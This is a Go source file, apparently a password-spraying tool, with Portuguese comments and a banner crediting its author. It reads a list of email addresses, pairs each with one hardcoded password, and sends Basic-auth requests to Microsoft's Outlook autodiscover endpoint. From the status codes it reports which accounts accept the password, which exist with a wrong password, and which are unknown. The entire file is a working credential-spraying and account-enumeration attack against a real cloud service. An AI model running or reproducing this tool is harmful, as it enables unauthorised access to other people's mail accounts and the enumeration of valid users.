package main

// Author: Eduardo Barbosa (@anakein)
// 28/06/2021
// anakein@protonmail.ch
// LinkedIn: https://www.linkedin.com/in/an4kein/

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
)

var banner = `
__ __ ________ __ ______  ___ ___          
|| ||||   || \\||||   || //  // \\     
\\ //||== ||_//||||== ||((   ||=||
 \V/ ||___|| \\||||   || \\__|| ||
 [+] by @anakein
 [+] https://github.com/an4kein					
																	   
`

var sera []string

func ReadLine() []string {
	var senha string = "13371337hack"                       //COLOQUE A SENHA PARA SER TESTADA CONTRA AS CONTAS.
	file, err := os.Open("/home/anakein/Desktop/email.txt") // Caminho do seu arquivo com emails, exemplo: emails.txt
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		teste := fmt.Sprintf("%s:%s", scanner.Text(), senha)
		sEnc := b64.StdEncoding.EncodeToString([]byte(teste))
		sera = append(sera, sEnc)
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return sera
}

func main() {
	fmt.Println(banner)
	emails := ReadLine()
	for _, usernames := range emails {
		email_dec := usernames
		sDec, _ := b64.StdEncoding.DecodeString(email_dec)
		url := "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
		client := http.Client{}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			panic(err)
		}
		senhab64 := fmt.Sprintf("Basic %s", usernames)
		req.Header = http.Header{
			"Host":           []string{"autodiscover-s.outlook.com"},
			"Authorization":  []string{senhab64},
			"User-Agent":     []string{"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"},
			"Content-Length": []string{strconv.Itoa(2)},
		}
		res, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		switch res.StatusCode {
		case 200:
			fmt.Println("[+] (SUCESSO) - USUÁRIO VÁLIDO MAIS SENHA VÁLIDA", string(sDec))
		case 401:
			fmt.Println("[!] USUÁRIO VÁLIDO, MAS A SENHA É INVALIDA", string(sDec))
		case 403:
			fmt.Println("[-] CONTA DESCONHECIDA", string(sDec))
		default:
			fmt.Println("tente outros emails", string(sDec))
		}
	}
}
